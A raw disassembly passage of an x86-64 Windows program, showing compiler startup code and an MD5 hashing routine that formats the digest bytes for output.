   14000258d:	e9 02 00 00 00       	jmp    0x140002594
   140002592:	cc                   	int3
   140002593:	cc                   	int3
   140002594:	48 83 ec 28          	sub    $0x28,%rsp
   140002598:	e8 4b 16 00 00       	call   0x140003be8
   14000259d:	e8 12 18 00 00       	call   0x140003db4
   1400025a2:	e8 c9 0e 00 00       	call   0x140003470
   1400025a7:	e8 78 39 00 00       	call   0x140005f24
   1400025ac:	80 3d 81 d6 00 00 00 	cmpb   $0x0,0xd681(%rip)        # 0x14000fc34
   1400025b3:	74 0c                	je     0x1400025c1
   1400025b5:	e8 ba 32 00 00       	call   0x140005874
   1400025ba:	c6 05 73 d6 00 00 00 	movb   $0x0,0xd673(%rip)        # 0x14000fc34
   1400025c1:	48 83 c4 28          	add    $0x28,%rsp
   1400025c5:	e9 9e ee ff ff       	jmp    0x140001468
   1400025ca:	cc                   	int3
   1400025cb:	cc                   	int3
   1400025cc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400025d1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400025d6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400025db:	57                   	push   %rdi
   1400025dc:	48 83 ec 20          	sub    $0x20,%rsp
   1400025e0:	48 8b fa             	mov    %rdx,%rdi
   1400025e3:	48 8b e9             	mov    %rcx,%rbp
   1400025e6:	33 f6                	xor    %esi,%esi
   1400025e8:	e8 8b f3 ff ff       	call   0x140001978
   1400025ed:	e8 26 f4 ff ff       	call   0x140001a18
   1400025f2:	8d 4e 08             	lea    0x8(%rsi),%ecx
   1400025f5:	e8 26 f5 ff ff       	call   0x140001b20
   1400025fa:	8d 4e 07             	lea    0x7(%rsi),%ecx
   1400025fd:	48 8b d8             	mov    %rax,%rbx
   140002600:	e8 1b f5 ff ff       	call   0x140001b20
   140002605:	48 8b c8             	mov    %rax,%rcx
   140002608:	48 8b d3             	mov    %rbx,%rdx
   14000260b:	e8 2c f3 ff ff       	call   0x14000193c
   140002610:	4c 8d 05 69 ff ff ff 	lea    -0x97(%rip),%r8        # 0x140002580
   140002617:	48 8b d7             	mov    %rdi,%rdx
   14000261a:	48 8b cd             	mov    %rbp,%rcx
   14000261d:	e8 16 ee ff ff       	call   0x140001438
   140002622:	84 c0                	test   %al,%al
   140002624:	74 5c                	je     0x140002682
   140002626:	e8 a5 3e 00 00       	call   0x1400064d0
   14000262b:	84 c0                	test   %al,%al
   14000262d:	74 53                	je     0x140002682
   14000262f:	e8 48 f1 ff ff       	call   0x14000177c
   140002634:	48 8b c8             	mov    %rax,%rcx
   140002637:	e8 74 31 00 00       	call   0x1400057b0
   14000263c:	85 c0                	test   %eax,%eax
   14000263e:	0f 99 05 ef d5 00 00 	setns  0xd5ef(%rip)        # 0x14000fc34
   140002645:	85 c0                	test   %eax,%eax
   140002647:	78 39                	js     0x140002682
   140002649:	48 8b cd             	mov    %rbp,%rcx
   14000264c:	e8 47 0e 00 00       	call   0x140003498
   140002651:	84 c0                	test   %al,%al
   140002653:	74 2d                	je     0x140002682
   140002655:	48 8d 0d 04 92 00 00 	lea    0x9204(%rip),%rcx        # 0x14000b860
   14000265c:	e8 13 28 00 00       	call   0x140004e74
   140002661:	48 8d 15 08 fd ff ff 	lea    -0x2f8(%rip),%rdx        # 0x140002370
   140002668:	48 8d 0d 09 92 00 00 	lea    0x9209(%rip),%rcx        # 0x14000b878
   14000266f:	e8 d4 24 00 00       	call   0x140004b48
   140002674:	84 c0                	test   %al,%al
   140002676:	40 0f b6 f6          	movzbl %sil,%esi
   14000267a:	ba 01 00 00 00       	mov    $0x1,%edx
   14000267f:	0f 45 f2             	cmovne %edx,%esi
   140002682:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002687:	40 8a c6             	mov    %sil,%al
   14000268a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000268f:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140002694:	48 83 c4 20          	add    $0x20,%rsp
   140002698:	5f                   	pop    %rdi
   140002699:	c3                   	ret
   14000269a:	cc                   	int3
   14000269b:	cc                   	int3
   14000269c:	40 53                	rex push %rbx
   14000269e:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400026a5:	48 8b 05 04 91 00 00 	mov    0x9104(%rip),%rax        # 0x14000b7b0
   1400026ac:	48 33 c4             	xor    %rsp,%rax
   1400026af:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   1400026b6:	00 
   1400026b7:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   1400026bc:	49 8b d8             	mov    %r8,%rbx
   1400026bf:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   1400026c4:	44 8b c2             	mov    %edx,%r8d
   1400026c7:	48 8b d1             	mov    %rcx,%rdx
   1400026ca:	c7 44 24 20 01 23 45 	movl   $0x67452301,0x20(%rsp)
   1400026d1:	67 
   1400026d2:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   1400026d7:	c7 44 24 24 89 ab cd 	movl   $0xefcdab89,0x24(%rsp)
   1400026de:	ef 
   1400026df:	c7 44 24 28 fe dc ba 	movl   $0x98badcfe,0x28(%rsp)
   1400026e6:	98 
   1400026e7:	c7 44 24 2c 76 54 32 	movl   $0x10325476,0x2c(%rsp)
   1400026ee:	10 
   1400026ef:	e8 bc 0a 00 00       	call   0x1400031b0
   1400026f4:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400026f9:	48 8b cb             	mov    %rbx,%rcx
   1400026fc:	e8 1f 01 00 00       	call   0x140002820
   140002701:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   140002708:	00 
   140002709:	48 33 cc             	xor    %rsp,%rcx
   14000270c:	e8 9f 49 00 00       	call   0x1400070b0
   140002711:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   140002718:	5b                   	pop    %rbx
   140002719:	c3                   	ret
   14000271a:	cc                   	int3
   14000271b:	cc                   	int3
   14000271c:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140002721:	55                   	push   %rbp
   140002722:	56                   	push   %rsi
   140002723:	57                   	push   %rdi
   140002724:	41 54                	push   %r12
   140002726:	41 55                	push   %r13
   140002728:	41 56                	push   %r14
   14000272a:	41 57                	push   %r15
   14000272c:	48 8d 6c 24 d9       	lea    -0x27(%rsp),%rbp
   140002731:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140002738:	48 8b 05 71 90 00 00 	mov    0x9071(%rip),%rax        # 0x14000b7b0
   14000273f:	48 33 c4             	xor    %rsp,%rax
   140002742:	48 89 45 1f          	mov    %rax,0x1f(%rbp)
   140002746:	4c 89 45 07          	mov    %r8,0x7(%rbp)
   14000274a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000274d:	4c 8d 45 0f          	lea    0xf(%rbp),%r8
   140002751:	0f 11 45 0f          	movups %xmm0,0xf(%rbp)
   140002755:	e8 42 ff ff ff       	call   0x14000269c
   14000275a:	0f b6 45 1e          	movzbl 0x1e(%rbp),%eax
   14000275e:	0f b6 55 1d          	movzbl 0x1d(%rbp),%edx
   140002762:	44 0f b6 55 1c       	movzbl 0x1c(%rbp),%r10d
   140002767:	44 0f b6 5d 1b       	movzbl 0x1b(%rbp),%r11d
   14000276c:	0f b6 4d 13          	movzbl 0x13(%rbp),%ecx
   140002770:	0f b6 5d 1a          	movzbl 0x1a(%rbp),%ebx
   140002774:	0f b6 7d 19          	movzbl 0x19(%rbp),%edi
   140002778:	0f b6 75 18          	movzbl 0x18(%rbp),%esi
   14000277c:	44 0f b6 75 17       	movzbl 0x17(%rbp),%r14d
   140002781:	44 0f b6 7d 16       	movzbl 0x16(%rbp),%r15d
   140002786:	44 0f b6 65 15       	movzbl 0x15(%rbp),%r12d
   14000278b:	44 0f b6 6d 14       	movzbl 0x14(%rbp),%r13d
   140002790:	44 0f b6 4d 10       	movzbl 0x10(%rbp),%r9d
   140002795:	44 0f b6 45 0f       	movzbl 0xf(%rbp),%r8d
   14000279a:	89 84 24 88 00 00 00 	mov    %eax,0x88(%rsp)
   1400027a1:	0f b6 45 12          	movzbl 0x12(%rbp),%eax
   1400027a5:	89 94 24 80 00 00 00 	mov    %edx,0x80(%rsp)
   1400027ac:	48 8d 15 0d 4e 00 00 	lea    0x4e0d(%rip),%rdx        # 0x1400075c0
   1400027b3:	44 89 54 24 78       	mov    %r10d,0x78(%rsp)
   1400027b8:	44 89 5c 24 70       	mov    %r11d,0x70(%rsp)
   1400027bd:	89 5c 24 68          	mov    %ebx,0x68(%rsp)
   1400027c1:	89 7c 24 60          	mov    %edi,0x60(%rsp)
   1400027c5:	89 74 24 58          	mov    %esi,0x58(%rsp)
   1400027c9:	44 89 74 24 50       	mov    %r14d,0x50(%rsp)
   1400027ce:	44 89 7c 24 48       	mov    %r15d,0x48(%rsp)
   1400027d3:	44 89 64 24 40       	mov    %r12d,0x40(%rsp)
   1400027d8:	44 89 6c 24 38       	mov    %r13d,0x38(%rsp)
   1400027dd:	89 4c 24 30          	mov    %ecx,0x30(%rsp)
   1400027e1:	48 8b 4d 07          	mov    0x7(%rbp),%rcx
   1400027e5:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400027e9:	0f b6 45 11          	movzbl 0x11(%rbp),%eax
   1400027ed:	89 44 24 20          	mov    %eax,0x20(%rsp)
   1400027f1:	e8 2e 48 00 00       	call   0x140007024
   1400027f6:	48 8b 4d 1f          	mov    0x1f(%rbp),%rcx
   1400027fa:	48 33 cc             	xor    %rsp,%rcx
   1400027fd:	e8 ae 48 00 00       	call   0x1400070b0
   140002802:	48 8b 9c 24 08 01 00 	mov    0x108(%rsp),%rbx
   140002809:	00 
   14000280a:	48 81 c4 b0 00 00 00 	add    $0xb0,%rsp
   140002811:	41 5f                	pop    %r15
   140002813:	41 5e                	pop    %r14
   140002815:	41 5d                	pop    %r13
   140002817:	41 5c                	pop    %r12
   140002819:	5f                   	pop    %rdi
   14000281a:	5e                   	pop    %rsi
   14000281b:	5d                   	pop    %rbp
   14000281c:	c3                   	ret
   14000281d:	cc                   	int3
   14000281e:	cc                   	int3
   14000281f:	cc                   	int3
   140002820:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002825:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000282a:	57                   	push   %rdi
   14000282b:	48 83 ec 30          	sub    $0x30,%rsp
   14000282f:	48 8b 05 7a 8f 00 00 	mov    0x8f7a(%rip),%rax        # 0x14000b7b0
   140002836:	48 33 c4             	xor    %rsp,%rax
   140002839:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000283e:	33 ff                	xor    %edi,%edi
   140002840:	48 8b da             	mov    %rdx,%rbx
   140002843:	48 8b f1             	mov    %rcx,%rsi
   140002846:	48 8d 54 24 22       	lea    0x22(%rsp),%rdx
   14000284b:	44 8b c7             	mov    %edi,%r8d
   14000284e:	44 8d 4f 02          	lea    0x2(%rdi),%r9d
   140002852:	41 8b c8             	mov    %r8d,%ecx
   140002855:	41 ff c0             	inc    %r8d
   140002858:	8a 44 8b 10          	mov    0x10(%rbx,%rcx,4),%al
   14000285c:	88 42 fe             	mov    %al,-0x2(%rdx)
   14000285f:	8a 44 8b 11          	mov    0x11(%rbx,%rcx,4),%al
   140002863:	88 42 ff             	mov    %al,-0x1(%rdx)
   140002866:	8a 44 8b 12          	mov    0x12(%rbx,%rcx,4),%al
   14000286a:	88 02                	mov    %al,(%rdx)
   14000286c:	48 8d 52 04          	lea    0x4(%rdx),%rdx
   140002870:	8a 44 8b 13          	mov    0x13(%rbx,%rcx,4),%al
   140002874:	88 42 fd             	mov    %al,-0x3(%rdx)
   140002877:	49 83 e9 01          	sub    $0x1,%r9
   14000287b:	75 d5                	jne    0x140002852
   14000287d:	8b 4b 10             	mov    0x10(%rbx),%ecx
   140002880:	41 8d 41 38          	lea    0x38(%r9),%eax
   140002884:	c1 e9 03             	shr    $0x3,%ecx
   140002887:	45 8d 41 78          	lea    0x78(%r9),%r8d
   14000288b:	83 e1 3f             	and    $0x3f,%ecx
   14000288e:	48 8d 15 9b 8e 00 00 	lea    0x8e9b(%rip),%rdx        # 0x14000b730
   140002895:	2b c1                	sub    %ecx,%eax
   140002897:	44 2b c1             	sub    %ecx,%r8d
   14000289a:	83 f9 38             	cmp    $0x38,%ecx
   14000289d:	48 8b cb             	mov    %rbx,%rcx
   1400028a0:	44 0f 42 c0          	cmovb  %eax,%r8d
   1400028a4:	e8 07 09 00 00       	call   0x1400031b0
   1400028a9:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   1400028af:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400028b4:	48 8b cb             	mov    %rbx,%rcx
   1400028b7:	e8 f4 08 00 00       	call   0x1400031b0
   1400028bc:	48 8d 4e 02          	lea    0x2(%rsi),%rcx
   1400028c0:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   1400028c6:	8a 04 bb             	mov    (%rbx,%rdi,4),%al
   1400028c9:	88 41 fe             	mov    %al,-0x2(%rcx)
   1400028cc:	8a 44 bb 01          	mov    0x1(%rbx,%rdi,4),%al
   1400028d0:	88 41 ff             	mov    %al,-0x1(%rcx)
   1400028d3:	8a 44 bb 02          	mov    0x2(%rbx,%rdi,4),%al
   1400028d7:	88 01                	mov    %al,(%rcx)
   1400028d9:	48 8d 49 04          	lea    0x4(%rcx),%rcx
   1400028dd:	8a 44 bb 03          	mov    0x3(%rbx,%rdi,4),%al
   1400028e1:	ff c7                	inc    %edi
   1400028e3:	88 41 fd             	mov    %al,-0x3(%rcx)
   1400028e6:	49 83 e8 01          	sub    $0x1,%r8
   1400028ea:	75 da                	jne    0x1400028c6
   1400028ec:	33 d2                	xor    %edx,%edx
   1400028ee:	48 8b cb             	mov    %rbx,%rcx
   1400028f1:	44 8d 42 58          	lea    0x58(%rdx),%r8d
   1400028f5:	e8 86 4b 00 00       	call   0x140007480
   1400028fa:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400028ff:	48 33 cc             	xor    %rsp,%rcx
   140002902:	e8 a9 47 00 00       	call   0x1400070b0
   140002907:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000290c:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140002911:	48 83 c4 30          	add    $0x30,%rsp
   140002915:	5f                   	pop    %rdi
   140002916:	c3                   	ret
   140002917:	cc                   	int3
   140002918:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000291d:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140002922:	55                   	push   %rbp
   140002923:	48 8d 6c 24 a9       	lea    -0x57(%rsp),%rbp
   140002928:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   14000292f:	48 8b 05 7a 8e 00 00 	mov    0x8e7a(%rip),%rax        # 0x14000b7b0
   140002936:	48 33 c4             	xor    %rsp,%rax
   140002939:	48 89 45 47          	mov    %rax,0x47(%rbp)
   14000293d:	8b 39                	mov    (%rcx),%edi
   14000293f:	45 33 c0             	xor    %r8d,%r8d
   140002942:	44 8b 51 04          	mov    0x4(%rcx),%r10d
   140002946:	48 83 c2 02          	add    $0x2,%rdx
   14000294a:	44 8b 59 08          	mov    0x8(%rcx),%r11d
   14000294e:	8b 59 0c             	mov    0xc(%rcx),%ebx
   140002951:	45 8d 48 10          	lea    0x10(%r8),%r9d
   140002955:	48 89 4d f7          	mov    %rcx,-0x9(%rbp)
   140002959:	89 7d e7             	mov    %edi,-0x19(%rbp)
   14000295c:	44 89 55 eb          	mov    %r10d,-0x15(%rbp)
   140002960:	44 89 5d ef          	mov    %r11d,-0x11(%rbp)
   140002964:	89 5d f3             	mov    %ebx,-0xd(%rbp)
   140002967:	0f b6 02             	movzbl (%rdx),%eax
   14000296a:	0f b6 4a 01          	movzbl 0x1(%rdx),%ecx
   14000296e:	48 8d 52 04          	lea    0x4(%rdx),%rdx
   140002972:	c1 e1 08             	shl    $0x8,%ecx
   140002975:	0b c8                	or     %eax,%ecx
   140002977:	0f b6 42 fb          	movzbl -0x5(%rdx),%eax
   14000297b:	c1 e1 08             	shl    $0x8,%ecx
   14000297e:	0b c8                	or     %eax,%ecx
   140002980:	0f b6 42 fa          	movzbl -0x6(%rdx),%eax
   140002984:	c1 e1 08             	shl    $0x8,%ecx
   140002987:	0b c8                	or     %eax,%ecx
   140002989:	42 89 4c 85 07       	mov    %ecx,0x7(%rbp,%r8,4)
   14000298e:	41 ff c0             	inc    %r8d
   140002991:	49 83 e9 01          	sub    $0x1,%r9
   140002995:	75 d0                	jne    0x140002967
   140002997:	41 8b ca             	mov    %r10d,%ecx
   14000299a:	45 8d 8b db 70 20 24 	lea    0x242070db(%r11),%r9d
   1400029a1:	f7 d1                	not    %ecx
   1400029a3:	8d 97 78 a4 6a d7    	lea    -0x28955b88(%rdi),%edx
   1400029a9:	23 cb                	and    %ebx,%ecx
   1400029ab:	44 8d 83 56 b7 c7 e8 	lea    -0x173848aa(%rbx),%r8d
   1400029b2:	41 8b c3             	mov    %r11d,%eax
   1400029b5:	41 23 c2             	and    %r10d,%eax
   1400029b8:	0b c8                	or     %eax,%ecx
   1400029ba:	41 8b c2             	mov    %r10d,%eax
   1400029bd:	03 4d 07             	add    0x7(%rbp),%ecx
   1400029c0:	03 d1                	add    %ecx,%edx
   1400029c2:	c1 c2 07             	rol    $0x7,%edx
   1400029c5:	41 03 d2             	add    %r10d,%edx
   1400029c8:	23 c2                	and    %edx,%eax
   1400029ca:	8b ca                	mov    %edx,%ecx
   1400029cc:	f7 d1                	not    %ecx
   1400029ce:	41 23 cb             	and    %r11d,%ecx
   1400029d1:	0b c8                	or     %eax,%ecx
   1400029d3:	44 8d 9a af 0f 7c f5 	lea    -0xa83f051(%rdx),%r11d
   1400029da:	03 4d 0b             	add    0xb(%rbp),%ecx
   1400029dd:	44 03 c1             	add    %ecx,%r8d
   1400029e0:	41 c1 c0 0c          	rol    $0xc,%r8d
   1400029e4:	44 03 c2             	add    %edx,%r8d
   1400029e7:	41 8b c8             	mov    %r8d,%ecx
   1400029ea:	41 8b c0             	mov    %r8d,%eax
   1400029ed:	f7 d1                	not    %ecx
   1400029ef:	23 c2                	and    %edx,%eax
   1400029f1:	41 23 ca             	and    %r10d,%ecx
   1400029f4:	41 81 c2 ee ce bd c1 	add    $0xc1bdceee,%r10d
   1400029fb:	0b c8                	or     %eax,%ecx
   1400029fd:	41 8b c0             	mov    %r8d,%eax
   140002a00:	03 4d 0f             	add    0xf(%rbp),%ecx
   140002a03:	44 03 c9             	add    %ecx,%r9d
   140002a06:	41 c1 c9 0f          	ror    $0xf,%r9d
   140002a0a:	45 03 c8             	add    %r8d,%r9d
   140002a0d:	41 23 c1             	and    %r9d,%eax
   140002a10:	41 8b c9             	mov    %r9d,%ecx
   140002a13:	f7 d1                	not    %ecx
   140002a15:	23 ca                	and    %edx,%ecx
   140002a17:	41 8d 90 2a c6 87 47 	lea    0x4787c62a(%r8),%edx
   140002a1e:	0b c8                	or     %eax,%ecx
   140002a20:	41 8b c1             	mov    %r9d,%eax
   140002a23:	03 4d 13             	add    0x13(%rbp),%ecx
   140002a26:	44 03 d1             	add    %ecx,%r10d
   140002a29:	41 c1 ca 0a          	ror    $0xa,%r10d
   140002a2d:	45 03 d1             	add    %r9d,%r10d
   140002a30:	41 23 c2             	and    %r10d,%eax
   140002a33:	41 8b ca             	mov    %r10d,%ecx
   140002a36:	f7 d1                	not    %ecx
   140002a38:	41 23 c8             	and    %r8d,%ecx
   140002a3b:	45 8d 81 13 46 30 a8 	lea    -0x57cfb9ed(%r9),%r8d
   140002a42:	0b c8                	or     %eax,%ecx
   140002a44:	41 8b c2             	mov    %r10d,%eax
   140002a47:	03 4d 17             	add    0x17(%rbp),%ecx
   140002a4a:	44 03 d9             	add    %ecx,%r11d
   140002a4d:	41 c1 c3 07          	rol    $0x7,%r11d
   140002a51:	45 03 da             	add    %r10d,%r11d
   140002a54:	41 23 c3             	and    %r11d,%eax
   140002a57:	41 8b cb             	mov    %r11d,%ecx
   140002a5a:	f7 d1                	not    %ecx
   140002a5c:	41 23 c9             	and    %r9d,%ecx
   140002a5f:	0b c8                	or     %eax,%ecx
   140002a61:	03 4d 1b             	add    0x1b(%rbp),%ecx
   140002a64:	03 d1                	add    %ecx,%edx
   140002a66:	c1 c2 0c             	rol    $0xc,%edx
   140002a69:	41 03 d3             	add    %r11d,%edx
   140002a6c:	8b ca                	mov    %edx,%ecx
   140002a6e:	8b c2                	mov    %edx,%eax
   140002a70:	f7 d1                	not    %ecx
   140002a72:	41 23 c3             	and    %r11d,%eax
   140002a75:	41 23 ca             	and    %r10d,%ecx
   140002a78:	0b c8                	or     %eax,%ecx
   140002a7a:	8b c2                	mov    %edx,%eax
   140002a7c:	03 4d 1f             	add    0x1f(%rbp),%ecx
   140002a7f:	44 03 c1             	add    %ecx,%r8d
   140002a82:	41 c1 c8 0f          	ror    $0xf,%r8d
   140002a86:	44 03 c2             	add    %edx,%r8d
   140002a89:	41 8b c8             	mov    %r8d,%ecx
   140002a8c:	f7 d1                	not    %ecx
   140002a8e:	41 23 cb             	and    %r11d,%ecx
   140002a91:	41 23 c0             	and    %r8d,%eax
   140002a94:	45 8d 8a 01 95 46 fd 	lea    -0x2b96aff(%r10),%r9d
   140002a9b:	0b c8                	or     %eax,%ecx
   140002a9d:	41 8b c0             	mov    %r8d,%eax
   140002aa0:	03 4d 23             	add    0x23(%rbp),%ecx
   140002aa3:	44 03 c9             	add    %ecx,%r9d
   140002aa6:	41 c1 c9 0a          	ror    $0xa,%r9d
   140002aaa:	45 03 c8             	add    %r8d,%r9d
   140002aad:	41 23 c1             	and    %r9d,%eax
   140002ab0:	45 8b d1             	mov    %r9d,%r10d
   140002ab3:	41 f7 d2             	not    %r10d
   140002ab6:	44 23 d2             	and    %edx,%r10d
   140002ab9:	44 0b d0             	or     %eax,%r10d
   140002abc:	41 8b c1             	mov    %r9d,%eax
   140002abf:	41 81 c2 d8 98 80 69 	add    $0x698098d8,%r10d
   140002ac6:	44 03 55 27          	add    0x27(%rbp),%r10d
   140002aca:	45 03 d3             	add    %r11d,%r10d
   140002acd:	41 c1 c2 07          	rol    $0x7,%r10d
   140002ad1:	45 03 d1             	add    %r9d,%r10d
   140002ad4:	41 23 c2             	and    %r10d,%eax
   140002ad7:	41 8b ca             	mov    %r10d,%ecx
   140002ada:	f7 d1                	not    %ecx
   140002adc:	41 23 c8             	and    %r8d,%ecx
   140002adf:	0b c8                	or     %eax,%ecx
   140002ae1:	45 8d 9a 22 11 90 6b 	lea    0x6b901122(%r10),%r11d
   140002ae8:	81 c1 af f7 44 8b    	add    $0x8b44f7af,%ecx
   140002aee:	03 4d 2b             	add    0x2b(%rbp),%ecx
   140002af1:	03 d1                	add    %ecx,%edx
   140002af3:	c1 c2 0c             	rol    $0xc,%edx
   140002af6:	41 03 d2             	add    %r10d,%edx
   140002af9:	8b fa                	mov    %edx,%edi
   140002afb:	8b c2                	mov    %edx,%eax
   140002afd:	41 23 c2             	and    %r10d,%eax
   140002b00:	f7 d7                	not    %edi
   140002b02:	41 23 f9             	and    %r9d,%edi
   140002b05:	0b f8                	or     %eax,%edi
   140002b07:	8d 9a 93 71 98 fd    	lea    -0x2678e6d(%rdx),%ebx
   140002b0d:	81 c7 b1 5b ff ff    	add    $0xffff5bb1,%edi
   140002b13:	8b c2                	mov    %edx,%eax
   140002b15:	03 7d 2f             	add    0x2f(%rbp),%edi
   140002b18:	41 03 f8             	add    %r8d,%edi
   140002b1b:	c1 cf 0f             	ror    $0xf,%edi
   140002b1e:	03 fa                	add    %edx,%edi
   140002b20:	23 c7                	and    %edi,%eax
   140002b22:	8b cf                	mov    %edi,%ecx
   140002b24:	f7 d1                	not    %ecx
   140002b26:	41 23 ca             	and    %r10d,%ecx
   140002b29:	0b c8                	or     %eax,%ecx
   140002b2b:	8b c7                	mov    %edi,%eax
   140002b2d:	81 c1 be d7 5c 89    	add    $0x895cd7be,%ecx
   140002b33:	03 4d 33             	add    0x33(%rbp),%ecx
   140002b36:	44 03 c9             	add    %ecx,%r9d
   140002b39:	41 c1 c9 0a          	ror    $0xa,%r9d
   140002b3d:	44 03 cf             	add    %edi,%r9d
   140002b40:	41 23 c1             	and    %r9d,%eax
   140002b43:	41 8b c9             	mov    %r9d,%ecx
   140002b46:	f7 d1                	not    %ecx
   140002b48:	23 ca                	and    %edx,%ecx
   140002b4a:	0b c8                	or     %eax,%ecx
   140002b4c:	41 8b c1             	mov    %r9d,%eax
   140002b4f:	03 4d 37             	add    0x37(%rbp),%ecx
   140002b52:	44 03 d9             	add    %ecx,%r11d
   140002b55:	41 c1 c3 07          	rol    $0x7,%r11d
   140002b59:	45 03 d9             	add    %r9d,%r11d
   140002b5c:	41 23 c3             	and    %r11d,%eax
   140002b5f:	41 8b cb             	mov    %r11d,%ecx
   140002b62:	f7 d1                	not    %ecx
   140002b64:	23 cf                	and    %edi,%ecx
   140002b66:	0b c8                	or     %eax,%ecx
   140002b68:	03 4d 3b             	add    0x3b(%rbp),%ecx
   140002b6b:	03 d9                	add    %ecx,%ebx
   140002b6d:	c1 c3 0c             	rol    $0xc,%ebx
   140002b70:	41 03 db             	add    %r11d,%ebx
   140002b73:	44 8b c3             	mov    %ebx,%r8d
   140002b76:	8b c3                	mov    %ebx,%eax
   140002b78:	41 23 c3             	and    %r11d,%eax
   140002b7b:	41 f7 d0             	not    %r8d
   140002b7e:	41 8b c8             	mov    %r8d,%ecx
   140002b81:	41 23 c9             	and    %r9d,%ecx
   140002b84:	0b c8                	or     %eax,%ecx
   140002b86:	03 4d 3f             	add    0x3f(%rbp),%ecx
   140002b89:	44 8d 97 8e 43 79 a6 	lea    -0x5986bc72(%rdi),%r10d
   140002b90:	8b c3                	mov    %ebx,%eax
   140002b92:	44 03 d1             	add    %ecx,%r10d
   140002b95:	8b 7d 43             	mov    0x43(%rbp),%edi
   140002b98:	41 c1 ca 0f          	ror    $0xf,%r10d
   140002b9c:	44 03 d3             	add    %ebx,%r10d
   140002b9f:	41 23 c2             	and    %r10d,%eax
   140002ba2:	45 23 c2             	and    %r10d,%r8d
   140002ba5:	41 8b d2             	mov    %r10d,%edx
   140002ba8:	f7 d2                	not    %edx
   140002baa:	8b ca                	mov    %edx,%ecx
   140002bac:	41 23 cb             	and    %r11d,%ecx
   140002baf:	0b c8                	or     %eax,%ecx
   140002bb1:	8b c3                	mov    %ebx,%eax
   140002bb3:	81 c1 21 08 b4 49    	add    $0x49b40821,%ecx
   140002bb9:	03 cf                	add    %edi,%ecx
   140002bbb:	44 03 c9             	add    %ecx,%r9d
   140002bbe:	41 c1 c9 0a          	ror    $0xa,%r9d
   140002bc2:	45 03 ca             	add    %r10d,%r9d
   140002bc5:	41 23 c1             	and    %r9d,%eax
   140002bc8:	41 23 d1             	and    %r9d,%edx
   140002bcb:	44 0b c0             	or     %eax,%r8d
   140002bce:	41 8b c9             	mov    %r9d,%ecx
   140002bd1:	f7 d1                	not    %ecx
   140002bd3:	41 81 c0 62 25 1e f6 	add    $0xf61e2562,%r8d
   140002bda:	44 03 45 0b          	add    0xb(%rbp),%r8d
   140002bde:	45 03 d8             	add    %r8d,%r11d
   140002be1:	45 8b c2             	mov    %r10d,%r8d
   140002be4:	41 c1 c3 05          	rol    $0x5,%r11d
   140002be8:	45 03 d9             	add    %r9d,%r11d
   140002beb:	41 23 cb             	and    %r11d,%ecx
   140002bee:	45 23 c3             	and    %r11d,%r8d
   140002bf1:	44 0b c2             	or     %edx,%r8d
   140002bf4:	41 8d 92 51 5a 5e 26 	lea    0x265e5a51(%r10),%edx
   140002bfb:	41 81 c0 40 b3 40 c0 	add    $0xc040b340,%r8d
   140002c02:	45 8d 91 aa c7 b6 e9 	lea    -0x16493856(%r9),%r10d
   140002c09:	44 03 45 1f          	add    0x1f(%rbp),%r8d
   140002c0d:	44 03 c3             	add    %ebx,%r8d
   140002c10:	41 c1 c0 09          	rol    $0x9,%r8d
   140002c14:	45 03 c3             	add    %r11d,%r8d
   140002c17:	41 8b c0             	mov    %r8d,%eax
   140002c1a:	41 23 c1             	and    %r9d,%eax
   140002c1d:	45 8d 8b 5d 10 2f d6 	lea    -0x29d0efa3(%r11),%r9d
   140002c24:	0b c8                	or     %eax,%ecx
   140002c26:	03 4d 33             	add    0x33(%rbp),%ecx
   140002c29:	03 d1                	add    %ecx,%edx
   140002c2b:	41 8b cb             	mov    %r11d,%ecx
   140002c2e:	f7 d1                	not    %ecx
   140002c30:	c1 c2 0e             	rol    $0xe,%edx
   140002c33:	41 23 c8             	and    %r8d,%ecx
   140002c36:	41 03 d0             	add    %r8d,%edx
   140002c39:	8b c2                	mov    %edx,%eax
   140002c3b:	41 23 c3             	and    %r11d,%eax
   140002c3e:	45 8d 98 53 14 44 02 	lea    0x2441453(%r8),%r11d
   140002c45:	0b c8                	or     %eax,%ecx
   140002c47:	41 8b c0             	mov    %r8d,%eax
   140002c4a:	03 4d 07             	add    0x7(%rbp),%ecx
   140002c4d:	44 03 d1             	add    %ecx,%r10d
   140002c50:	41 8b c8             	mov    %r8d,%ecx
   140002c53:	f7 d1                	not    %ecx
   140002c55:	41 c1 ca 0c          	ror    $0xc,%r10d
   140002c59:	23 ca                	and    %edx,%ecx
   140002c5b:	44 03 d2             	add    %edx,%r10d
   140002c5e:	41 23 c2             	and    %r10d,%eax
   140002c61:	0b c8                	or     %eax,%ecx
   140002c63:	8b c2                	mov    %edx,%eax
   140002c65:	03 4d 1b             	add    0x1b(%rbp),%ecx
   140002c68:	44 03 c9             	add    %ecx,%r9d
   140002c6b:	8b ca                	mov    %edx,%ecx
   140002c6d:	f7 d1                	not    %ecx
